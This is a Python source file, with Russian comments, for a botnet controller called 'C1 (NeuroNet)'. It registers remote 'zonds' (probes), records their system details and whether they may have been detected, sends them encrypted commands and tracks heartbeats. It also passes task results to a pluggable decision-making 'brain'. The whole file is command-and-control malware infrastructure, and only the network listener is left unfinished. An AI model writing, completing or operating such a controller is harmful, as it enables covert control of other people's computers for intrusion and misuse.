#!/usr/bin/env python3
"""
Модуль управления ботнетом для серверного агента C1 (NeuroNet)
Обеспечивает централизованное управление зондами
"""

import os
import time
import uuid
import json
import logging
import threading
import asyncio
import socket
import sys
from typing import Dict, List, Any, Optional, Callable, Union, Tuple
from datetime import datetime
from enum import Enum

# Импортируем наш протокол связи
from zond_protocol import (
    ZondProtocol, ZondMessage, ZondTask, 
    MessageType, TaskPriority, TaskStatus
)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('botnet_controller.log')
    ]
)
logger = logging.getLogger('botnet_controller')

class ZondConnectionStatus(Enum):
    """Статусы подключения зондов"""
    ONLINE = "online"         # Зонд активен и отвечает на запросы
    OFFLINE = "offline"       # Зонд не на связи
    PENDING = "pending"       # Зонд в процессе подключения
    ERROR = "error"           # Ошибка связи с зондом
    COMPROMISED = "compromised"  # Возможно зонд обнаружен

class ZondInfo:
    """Информация о зонде"""
    def __init__(
        self,
        zond_id: str,
        system_info: Dict[str, Any],
        capabilities: List[str],
        status: ZondConnectionStatus = ZondConnectionStatus.PENDING,
        last_seen: Optional[float] = None,
        ip_address: Optional[str] = None,
        tasks: Optional[Dict[str, ZondTask]] = None
    ):
        """
        Инициализация информации о зонде
        
        Args:
            zond_id: Уникальный идентификатор зонда
            system_info: Информация о системе зонда
            capabilities: Список возможностей зонда
            status: Текущий статус подключения
            last_seen: Время последней активности зонда
            ip_address: IP-адрес зонда
            tasks: Словарь задач, отправленных на зонд
        """
        self.zond_id = zond_id
        self.system_info = system_info
        self.capabilities = capabilities
        self.status = status
        self.last_seen = last_seen or time.time()
        self.ip_address = ip_address
        self.tasks = tasks or {}
        self.registration_time = time.time()
        
    def to_dict(self) -> Dict[str, Any]:
        """Преобразование информации о зонде в словарь"""
        return {
            "zond_id": self.zond_id,
            "system_info": self.system_info,
            "capabilities": self.capabilities,
            "status": self.status.value,
            "last_seen": self.last_seen,
            "ip_address": self.ip_address,
            "tasks": {
                task_id: task.to_dict() 
                for task_id, task in self.tasks.items()
            },
            "registration_time": self.registration_time
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ZondInfo':
        """Создание объекта информации о зонде из словаря"""
        tasks = {}
        if "tasks" in data:
            tasks = {
                task_id: ZondTask.from_dict(task_data)
                for task_id, task_data in data["tasks"].items()
            }
        
        return cls(
            zond_id=data["zond_id"],
            system_info=data["system_info"],
            capabilities=data["capabilities"],
            status=ZondConnectionStatus(data["status"]),
            last_seen=data["last_seen"],
            ip_address=data.get("ip_address"),
            tasks=tasks
        )
    
    def update_status(self, status: ZondConnectionStatus) -> None:
        """Обновляет статус зонда"""
        self.status = status
        self.last_seen = time.time()
    
    def update_last_seen(self) -> None:
        """Обновляет время последней активности зонда"""
        self.last_seen = time.time()
    
    def add_task(self, task: ZondTask) -> None:
        """Добавляет задачу в список задач зонда"""
        self.tasks[task.task_id] = task
    
    def update_task(self, task_id: str, status: TaskStatus, result: Optional[Dict[str, Any]] = None) -> None:
        """Обновляет статус и результат задачи"""
        if task_id in self.tasks:
            self.tasks[task_id].update_status(status, result)
    
    def get_task(self, task_id: str) -> Optional[ZondTask]:
        """Возвращает задачу по ее идентификатору"""
        return self.tasks.get(task_id)
    
    def remove_completed_tasks(self, older_than: Optional[float] = None) -> int:
        """
        Удаляет завершенные задачи
        
        Args:
            older_than: Если указано, удаляет только задачи старше указанного времени (в секундах)
            
        Returns:
            int: Количество удаленных задач
        """
        completed_statuses = [TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.TIMEOUT, TaskStatus.CANCELED]
        
        tasks_to_remove = []
        current_time = time.time()
        
        for task_id, task in self.tasks.items():
            if task.status in completed_statuses:
                if older_than is None or (current_time - task.updated_at) > older_than:
                    tasks_to_remove.append(task_id)
        
        for task_id in tasks_to_remove:
            del self.tasks[task_id]
        
        return len(tasks_to_remove)
    
    def is_idle(self) -> bool:
        """Проверяет, не выполняет ли зонд задачи в данный момент"""
        for task in self.tasks.values():
            if task.status == TaskStatus.RUNNING or task.status == TaskStatus.PENDING:
                return False
        return True


class BotnetController:
    """
    Контроллер ботнета для управления зондами
    """
    def __init__(
        self,
        server_id: str,
        secret_key: str,
        encryption_key: str,
        listen_host: str = "0.0.0.0",
        listen_port: int = 8443,
        heartbeat_interval: int = 60,
        cleanup_interval: int = 3600,
        storage_file: Optional[str] = "zonds_storage.json"
    ):
        """
        Инициализация контроллера ботнета
        
        Args:
            server_id: Идентификатор сервера C1
            secret_key: Секретный ключ для подписи сообщений
            encryption_key: Ключ шифрования данных
            listen_host: Хост для прослушивания входящих подключений
            listen_port: Порт для прослушивания входящих подключений
            heartbeat_interval: Интервал отправки проверки соединения (в секундах)
            cleanup_interval: Интервал очистки старых задач (в секундах)
            storage_file: Файл для хранения информации о зондах
        """
        self.server_id = server_id
        self.secret_key = secret_key
        self.encryption_key = encryption_key
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.heartbeat_interval = heartbeat_interval
        self.cleanup_interval = cleanup_interval
        self.storage_file = storage_file
        
        # Создаем протокол для C1
        self.protocol = ZondProtocol(
            agent_id=self.server_id,
            secret_key=self.secret_key,
            encryption_key=self.encryption_key
        )
        
        # Хранилище зондов
        self.zonds: Dict[str, ZondInfo] = {}
        
        # Хранилище активных соединений
        self.connections: Dict[str, socket.socket] = {}
        
        # Блокировка для потокобезопасности
        self.lock = threading.RLock()
        
        # Очередь сообщений для отправки
        self.message_queue: Dict[str, List[Tuple[ZondMessage, float]]] = {}
        
        # Флаг работы контроллера
        self.running = False
        
        # Мозг для обработки результатов (может быть не установлен)
        self.brain = None
        
        # Загружаем информацию о зондах из файла
        if self.storage_file and os.path.exists(self.storage_file):
            self.load_zonds()
    
    def _save_zonds(self) -> None:
        """Сохраняет информацию о зондах в файл"""
        if not self.storage_file:
            return
        
        with self.lock:
            try:
                zonds_data = {
                    zond_id: zond.to_dict()
                    for zond_id, zond in self.zonds.items()
                }
                
                with open(self.storage_file, 'w') as f:
                    json.dump(zonds_data, f, indent=2)
                
                logger.debug(f"Сохранена информация о {len(self.zonds)} зондах")
            except Exception as e:
                logger.error(f"Ошибка при сохранении информации о зондах: {str(e)}")
    
    def load_zonds(self) -> None:
        """Загружает информацию о зондах из файла"""
        if not self.storage_file or not os.path.exists(self.storage_file):
            return
        
        with self.lock:
            try:
                with open(self.storage_file, 'r') as f:
                    zonds_data = json.load(f)
                
                self.zonds = {
                    zond_id: ZondInfo.from_dict(zond_data)
                    for zond_id, zond_data in zonds_data.items()
                }
                
                # Устанавливаем статус OFFLINE для всех зондов при загрузке
                for zond in self.zonds.values():
                    zond.update_status(ZondConnectionStatus.OFFLINE)
                
                logger.info(f"Загружена информация о {len(self.zonds)} зондах")
            except Exception as e:
                logger.error(f"Ошибка при загрузке информации о зондах: {str(e)}")
    
    def register_zond(
        self, 
        zond_id: str, 
        system_info: Dict[str, Any], 
        capabilities: List[str],
        ip_address: Optional[str] = None
    ) -> ZondInfo:
        """
        Регистрирует новый зонд или обновляет информацию о существующем
        
        Args:
            zond_id: Идентификатор зонда
            system_info: Информация о системе зонда
            capabilities: Список возможностей зонда
            ip_address: IP-адрес зонда
            
        Returns:
            ZondInfo: Информация о зонде
        """
        with self.lock:
            if zond_id in self.zonds:
                # Обновляем информацию о существующем зонде
                zond = self.zonds[zond_id]
                zond.system_info = system_info
                zond.capabilities = capabilities
                zond.update_status(ZondConnectionStatus.ONLINE)
                if ip_address:
                    zond.ip_address = ip_address
                
                logger.info(f"Обновлена информация о зонде {zond_id}")
            else:
                # Создаем новый зонд
                zond = ZondInfo(
                    zond_id=zond_id,
                    system_info=system_info,
                    capabilities=capabilities,
                    status=ZondConnectionStatus.ONLINE,
                    ip_address=ip_address
                )
                self.zonds[zond_id] = zond
                
                logger.info(f"Зарегистрирован новый зонд {zond_id}")
            
            # Сохраняем обновленную информацию
            self._save_zonds()
            
            return zond
    
    def remove_zond(self, zond_id: str) -> bool:
        """
        Удаляет зонд из системы
        
        Args:
            zond_id: Идентификатор зонда
            
        Returns:
            bool: True если зонд был удален, иначе False
        """
        with self.lock:
            if zond_id in self.zonds:
                # Закрываем соединение, если есть
                if zond_id in self.connections:
                    try:
                        self.connections[zond_id].close()
                    except:
                        pass
                    del self.connections[zond_id]
                
                # Удаляем из очереди сообщений
                if zond_id in self.message_queue:
                    del self.message_queue[zond_id]
                
                # Удаляем зонд
                del self.zonds[zond_id]
                self._save_zonds()
                
                logger.info(f"Зонд {zond_id} удален")
                return True
            
            return False
    
    def get_zond(self, zond_id: str) -> Optional[ZondInfo]:
        """
        Возвращает информацию о зонде по его идентификатору
        
        Args:
            zond_id: Идентификатор зонда
            
        Returns:
            Optional[ZondInfo]: Информация о зонде или None, если зонд не найден
        """
        with self.lock:
            return self.zonds.get(zond_id)
    
    def get_all_zonds(self) -> Dict[str, ZondInfo]:
        """
        Возвращает словарь со всеми зондами
        
        Returns:
            Dict[str, ZondInfo]: Словарь зондов {zond_id: ZondInfo}
        """
        with self.lock:
            return self.zonds.copy()
    
    def get_online_zonds(self) -> Dict[str, ZondInfo]:
        """
        Возвращает словарь с активными зондами
        
        Returns:
            Dict[str, ZondInfo]: Словарь активных зондов {zond_id: ZondInfo}
        """
        with self.lock:
            return {
                zond_id: zond
                for zond_id, zond in self.zonds.items()
                if zond.status == ZondConnectionStatus.ONLINE
            }
    
    def create_task(
        self,
        zond_id: str,
        command: str,
        parameters: Dict[str, Any] = None,
        priority: TaskPriority = TaskPriority.MEDIUM,
        timeout: Optional[int] = None
    ) -> Optional[ZondTask]:
        """
        Создает и отправляет задачу для зонда
        
        Args:
            zond_id: Идентификатор зонда
            command: Команда для выполнения
            parameters: Параметры команды
            priority: Приоритет задачи
            timeout: Таймаут выполнения в секундах
            
        Returns:
            Optional[ZondTask]: Созданная задача или None в случае ошибки
        """
        with self.lock:
            zond = self.get_zond(zond_id)
            if not zond:
                logger.error(f"Зонд с ID {zond_id} не найден")
                return None
            
            if zond.status != ZondConnectionStatus.ONLINE:
                logger.error(f"Зонд {zond_id} не в сети (статус: {zond.status.value})")
                return None
            
            # Создаем задачу
            task_id = str(uuid.uuid4())
            task = ZondTask(
                task_id=task_id,
                command=command,
                parameters=parameters or {},
                priority=priority,
                timeout=timeout,
                zond_id=zond_id
            )
            
            # Добавляем задачу в список задач зонда
            zond.add_task(task)
            
            # Создаем сообщение с командой
            command_message = self.protocol.create_command(
                command=command,
                parameters=parameters or {},
                zond_id=zond_id,
                task_id=task_id,
                priority=priority,
                timeout=timeout
            )
            
            # Добавляем сообщение в очередь на отправку
            if zond_id not in self.message_queue:
                self.message_queue[zond_id] = []
            
            self.message_queue[zond_id].append((command_message, time.time()))
            
            # Сохраняем обновленную информацию
            self._save_zonds()
            
            logger.info(f"Создана задача {task_id} для зонда {zond_id}: {command}")
            
            # Попытка отправить сообщение, если есть соединение
            self._process_message_queue(zond_id)
            
            return task
    
    def send_command(
        self,
        zond_id: str,
        command: str,
        parameters: Dict[str, Any] = None,
        priority: TaskPriority = TaskPriority.MEDIUM,
        timeout: Optional[int] = None
    ) -> Optional[ZondTask]:
        """
        Отправляет команду зонду (алиас для create_task)
        
        Args:
            zond_id: Идентификатор зонда
            command: Команда для выполнения
            parameters: Параметры команды
            priority: Приоритет команды
            timeout: Таймаут выполнения в секундах
            
        Returns:
            Optional[ZondTask]: Созданная задача или None в случае ошибки
        """
        return self.create_task(
            zond_id=zond_id,
            command=command,
            parameters=parameters,
            priority=priority,
            timeout=timeout
        )
    
    def get_task_status(self, zond_id: str, task_id: str) -> Optional[TaskStatus]:
        """
        Возвращает статус задачи
        
        Args:
            zond_id: Идентификатор зонда
            task_id: Идентификатор задачи
            
        Returns:
            Optional[TaskStatus]: Статус задачи или None, если задача не найдена
        """
        with self.lock:
            zond = self.get_zond(zond_id)
            if not zond:
                return None
            
            task = zond.get_task(task_id)
            if not task:
                return None
            
            return task.status
    
    def get_task_result(self, zond_id: str, task_id: str) -> Optional[Dict[str, Any]]:
        """
        Возвращает результат выполнения задачи
        
        Args:
            zond_id: Идентификатор зонда
            task_id: Идентификатор задачи
            
        Returns:
            Optional[Dict[str, Any]]: Результат выполнения задачи или None, если результат не доступен
        """
        with self.lock:
            zond = self.get_zond(zond_id)
            if not zond:
                return None
            
            task = zond.get_task(task_id)
            if not task:
                return None
            
            return task.result
    
    def cancel_task(self, zond_id: str, task_id: str) -> bool:
        """
        Отменяет выполнение задачи
        
        Args:
            zond_id: Идентификатор зонда
            task_id: Идентификатор задачи
            
        Returns:
            bool: True если задача успешно отменена, иначе False
        """
        with self.lock:
            zond = self.get_zond(zond_id)
            if not zond:
                return False
            
            task = zond.get_task(task_id)
            if not task:
                return False
            
            if task.status in [TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.TIMEOUT, TaskStatus.CANCELED]:
                return False
            
            # Создаем сообщение с командой отмены
            cancel_message = self.protocol.create_message(
                message_type=MessageType.COMMAND,
                data={
                    "task_id": task_id,
                    "action": "cancel"
                },
                receiver_id=zond_id
            )
            
            # Обновляем статус задачи
            zond.update_task(task_id, TaskStatus.CANCELED)
            
            # Добавляем сообщение в очередь на отправку
            if zond_id not in self.message_queue:
                self.message_queue[zond_id] = []
            
            self.message_queue[zond_id].append((cancel_message, time.time()))
            
            # Сохраняем обновленную информацию
            self._save_zonds()
            
            # Попытка отправить сообщение, если есть соединение
            self._process_message_queue(zond_id)
            
            logger.info(f"Задача {task_id} для зонда {zond_id} отменена")
            
            return True
    
    def _process_message_queue(self, zond_id: str) -> None:
        """
        Обрабатывает очередь сообщений для указанного зонда
        
        Args:
            zond_id: Идентификатор зонда
        """
        if zond_id not in self.message_queue or not self.message_queue[zond_id]:
            return
        
        # Проверяем, есть ли соединение с зондом
        if zond_id not in self.connections:
            return
        
        with self.lock:
            # Сортируем сообщения по приоритету (сначала новые)
            messages = sorted(self.message_queue[zond_id], key=lambda x: x[1], reverse=True)
            
            for message, timestamp in messages:
                try:
                    # Шифруем сообщение
                    encrypted_message = self.protocol.encrypt_message(message)
                    
                    # Отправляем сообщение
                    # В реальной реализации нужно использовать более надежный способ отправки
                    self.connections[zond_id].sendall(encrypted_message.encode() + b'\n')
                    
                    # Удаляем сообщение из очереди
                    self.message_queue[zond_id].remove((message, timestamp))
                    
                    logger.debug(f"Сообщение {message.message_id} отправлено зонду {zond_id}")
                except Exception as e:
                    logger.error(f"Ошибка при отправке сообщения зонду {zond_id}: {str(e)}")
                    
                    # Если произошла ошибка, помечаем зонд как оффлайн
                    zond = self.get_zond(zond_id)
                    if zond:
                        zond.update_status(ZondConnectionStatus.OFFLINE)
                    
                    # Закрываем соединение
                    try:
                        self.connections[zond_id].close()
                    except:
                        pass
                    
                    del self.connections[zond_id]
                    break
    
    def process_incoming_message(self, zond_id: str, encrypted_data: str) -> None:
        """
        Обрабатывает входящее сообщение от зонда
        
        Args:
            zond_id: Идентификатор зонда
            encrypted_data: Зашифрованные данные сообщения
        """
        with self.lock:
            zond = self.get_zond(zond_id)
            if not zond:
                logger.warning(f"Получено сообщение от неизвестного зонда {zond_id}")
                return
            
            # Дешифруем и проверяем сообщение
            message = self.protocol.decrypt_message(encrypted_data)
            if not message:
                logger.error(f"Ошибка при дешифровании сообщения от зонда {zond_id}")
                return
            
            # Обновляем время последней активности зонда
            zond.update_last_seen()
            
            # Обрабатываем сообщение в зависимости от типа
            if message.message_type == MessageType.RESULT:
                self._handle_result_message(zond, message)
            elif message.message_type == MessageType.HEARTBEAT:
                self._handle_heartbeat_message(zond, message)
            elif message.message_type == MessageType.STATUS:
                self._handle_status_message(zond, message)
            elif message.message_type == MessageType.ERROR:
                self._handle_error_message(zond, message)
            
            # Сохраняем обновленную информацию
            self._save_zonds()
    
    def _handle_result_message(self, zond: ZondInfo, message: ZondMessage) -> None:
        """
        Обрабатывает сообщение с результатом выполнения задачи от зонда
        
        Args:
            zond: Информация о зонде
            message: Сообщение с результатом
        """
        data = message.data
        task_id = data.get("task_id")
        status = TaskStatus(data.get("status", "unknown"))
        result = data.get("result", {})
        
        if not task_id:
            logger.error(f"Получено сообщение с результатом без task_id от зонда {zond.zond_id}")
            return
        
        # Обновляем статус задачи
        zond.update_task(task_id, status, result)
        
        # Логируем результат
        logger.info(f"Получен результат для задачи {task_id} от зонда {zond.zond_id}: {status}")
        
        # Уведомляем мозг о результате выполнения задачи, если он установлен
        if self.brain:
            try:
                self.brain.process_task_result(
                    zond_id=zond.zond_id,
                    task_id=task_id,
                    status=status,
                    result=result
                )
                logger.debug(f"Мозг уведомлен о результате задачи {task_id}")
            except Exception as e:
                logger.error(f"Ошибка при уведомлении мозга о результате задачи {task_id}: {str(e)}")
        
        # Сохраняем обновленную информацию
        self._save_zonds()
        
        # Обновляем время последней активности зонда
        zond.update_last_seen()
    
    def _handle_heartbeat_message(self, zond: ZondInfo, message: ZondMessage) -> None:
        """
        Обрабатывает сообщение heartbeat
        
        Args:
            zond: Информация о зонде
            message: Сообщение heartbeat
        """
        # Просто обновляем статус и время последней активности
        zond.update_status(ZondConnectionStatus.ONLINE)
        
        # Отправляем ответный heartbeat
        self._send_heartbeat(zond.zond_id)
        
        logger.debug(f"Получен heartbeat от зонда {zond.zond_id}")
    
    def _handle_status_message(self, zond: ZondInfo, message: ZondMessage) -> None:
        """
        Обрабатывает сообщение о статусе зонда
        
        Args:
            zond: Информация о зонде
            message: Сообщение о статусе
        """
        status_str = message.data.get("status")
        if not status_str:
            return
        
        try:
            status = ZondConnectionStatus(status_str)
            zond.update_status(status)
            
            logger.info(f"Обновлен статус зонда {zond.zond_id}: {status.value}")
        except ValueError:
            logger.error(f"Получено сообщение с неверным статусом '{status_str}' от зонда {zond.zond_id}")
    
    def _handle_error_message(self, zond: ZondInfo, message: ZondMessage) -> None:
        """
        Обрабатывает сообщение об ошибке
        
        Args:
            zond: Информация о зонде
            message: Сообщение об ошибке
        """
        error_code = message.data.get("error_code", "unknown")
        error_message = message.data.get("error_message", "Неизвестная ошибка")
        task_id = message.data.get("task_id")
        
        logger.error(f"Получено сообщение об ошибке от зонда {zond.zond_id}: [{error_code}] {error_message}")
        
        # Если ошибка связана с конкретной задачей, обновляем ее статус
        if task_id:
            zond.update_task(
                task_id, 
                TaskStatus.FAILED, 
                {"error_code": error_code, "error_message": error_message}
            )
    
    def _send_heartbeat(self, zond_id: str) -> None:
        """
        Отправляет heartbeat зонду
        
        Args:
            zond_id: Идентификатор зонда
        """
        # Создаем сообщение heartbeat
        heartbeat_message = self.protocol.create_heartbeat(zond_id)
        
        # Добавляем в очередь на отправку
        with self.lock:
            if zond_id not in self.message_queue:
                self.message_queue[zond_id] = []
            
            self.message_queue[zond_id].append((heartbeat_message, time.time()))
            
            # Пытаемся сразу отправить
            self._process_message_queue(zond_id)
    
    def _heartbeat_monitor(self) -> None:
        """
        Поток для мониторинга соединений и отправки heartbeat
        """
        while self.running:
            try:
                # Получаем текущее время
                current_time = time.time()
                
                with self.lock:
                    # Проверяем все зонды
                    for zond_id, zond in list(self.zonds.items()):
                        # Если зонд в сети и прошло больше времени, чем интервал heartbeat
                        if (
                            zond.status == ZondConnectionStatus.ONLINE and 
                            (current_time - zond.last_seen) > self.heartbeat_interval
                        ):
                            # Отправляем heartbeat
                            self._send_heartbeat(zond_id)
                        
                        # Если зонд не отвечает слишком долго (в 3 раза больше интервала heartbeat)
                        if (
                            zond.status == ZondConnectionStatus.ONLINE and 
                            (current_time - zond.last_seen) > (self.heartbeat_interval * 3)
                        ):
                            # Помечаем как оффлайн
                            zond.update_status(ZondConnectionStatus.OFFLINE)
                            
                            # Если есть соединение, закрываем его
                            if zond_id in self.connections:
                                try:
                                    self.connections[zond_id].close()
                                except:
                                    pass
                                
                                del self.connections[zond_id]
                            
                            logger.info(f"Зонд {zond_id} помечен как оффлайн (нет ответа)")
                
                # Спим немного, чтобы не нагружать CPU
                time.sleep(10)
            
            except Exception as e:
                logger.error(f"Ошибка в мониторе heartbeat: {str(e)}")
                time.sleep(10)
    
    def _cleanup_tasks(self) -> None:
        """
        Поток для очистки старых задач
        """
        while self.running:
            try:
                with self.lock:
                    total_removed = 0
                    
                    # Проходим по всем зондам
                    for zond in self.zonds.values():
                        # Удаляем завершенные задачи старше 24 часов
                        removed = zond.remove_completed_tasks(24 * 3600)
                        total_removed += removed
                    
                    if total_removed > 0:
                        logger.info(f"Удалено {total_removed} завершенных задач")
                        
                        # Сохраняем обновленную информацию
                        self._save_zonds()
                
                # Спим до следующей очистки
                time.sleep(self.cleanup_interval)
            
            except Exception as e:
                logger.error(f"Ошибка в процессе очистки задач: {str(e)}")
                time.sleep(self.cleanup_interval)
    
    def start(self) -> None:
        """
        Запускает контроллер ботнета
        """
        if self.running:
            return
        
        self.running = True
        
        # Запускаем поток мониторинга heartbeat
        threading.Thread(
            target=self._heartbeat_monitor,
            daemon=True,
            name="HeartbeatMonitor"
        ).start()
        
        # Запускаем поток очистки задач
        threading.Thread(
            target=self._cleanup_tasks,
            daemon=True,
            name="TaskCleaner"
        ).start()
        
        logger.info(f"Контроллер ботнета запущен (server_id: {self.server_id})")
        
        # TODO: Реализовать прослушивание входящих подключений
        # В реальной реализации здесь должен быть код для создания сервера и
        # обработки входящих подключений от зондов
    
    def stop(self) -> None:
        """
        Останавливает контроллер ботнета
        """
        if not self.running:
            return
        
        self.running = False
        
        # Закрываем все соединения
        with self.lock:
            for conn in self.connections.values():
                try:
                    conn.close()
                except:
                    pass
            
            self.connections.clear()
        
        # Сохраняем информацию о зондах
        self._save_zonds()
        
        logger.info("Контроллер ботнета остановлен")

    def set_brain(self, brain) -> None:
        """
        Устанавливает мозг для обработки результатов и принятия решений.
        
        Args:
            brain: Экземпляр C1Brain
        """
        self.brain = brain
        logger.info("Установлен мозг для обработки результатов")


# Пример использования:
if __name__ == "__main__":
    # Создаем экземпляр контроллера
    controller = BotnetController(
        server_id="c1_server",
        secret_key="shared_secret_key",
        encryption_key="encryption_key_example",
        listen_port=8443
    )
    
    # Запускаем контроллер
    controller.start()
    
    try:
        # Имитация работы сервера
        print("Контроллер ботнета запущен. Нажмите Ctrl+C для остановки.")
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("Останавливаем контроллер...")
        controller.stop()
        print("Контроллер остановлен") 